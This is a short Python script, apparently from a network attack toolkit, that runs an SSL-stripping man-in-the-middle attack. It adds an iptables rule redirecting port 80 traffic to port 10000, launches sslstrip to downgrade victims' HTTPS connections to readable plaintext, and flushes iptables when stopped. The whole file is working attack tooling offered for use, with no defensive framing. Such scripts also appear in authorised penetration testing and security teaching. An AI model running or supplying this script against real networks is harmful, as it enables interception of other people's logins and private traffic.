#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os, sys
from colorama import Fore


     
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
print(Fore.RED+"[!]"+Fore.GREEN+" press CTRL+C to stop.")
os.system('sslstrip')
print("\n [+] Flushing IPtables")
os.system("iptables --flush")

     
